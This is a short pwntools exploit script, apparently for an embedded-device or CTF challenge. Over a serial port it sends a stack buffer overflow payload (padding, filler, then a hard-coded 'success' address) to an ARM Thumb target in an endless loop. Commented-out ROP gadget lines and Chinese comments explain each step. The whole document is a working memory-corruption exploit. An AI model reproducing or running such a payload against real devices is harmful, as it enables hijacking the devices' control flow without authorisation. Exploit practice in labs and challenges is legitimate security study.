#!/usr/bin/env python3

from pwn import *
import serial
import sys
import pdb

context.arch = 'thumb'
context.log_level = 'debug'  # 脚本在执行时就会输出debug的信息

# 构造与程序交互的对象
sh = serialtube('COM3', baudrate=115200)  # 更改串口路径为实际的串口路径

success_addr = 0x080552D4

# 构造payload
#payload = b'a' * 0x14 + b'bbbb' + p32(success_addr)
# 构造Payload
payload = b'A' * 0x24  # 触发溢出
#payload += p32(0x08056dc8)  # pop {r0, r1, ip, sp, pc} gadget地址
# payload += p32(0x0)  # R0寄存器的值（可以根据需要修改）
# payload += p32(0x0)  # R1寄存器的值（可以根据需要修改）
# payload += p32(0x0)  # IP寄存器的值（可以根据需要修改）
# payload += p32(0x0)  # SP寄存器的值（可以根据需要修改）
# payload+=p32(0x08056dc8)
payload += b'bbbb'  # R0寄存器的值（可以根据需要修改）
# payload += b'AAAA'  # R1寄存器的值（可以根据需要修改）
# payload += b'AAAA'  # IP寄存器的值（可以根据需要修改）
# payload += b'AAAA'  # SP寄存器的值（可以根据需要修改）
payload += p32(success_addr)

print('-------------')
print(payload)
# 向程序发送字符串
while(1):
    sh.sendline(payload)
    #sleep(1)
#sh.send_raw(payload)

# 将代码交互转换为手工交互
sh.interactive()
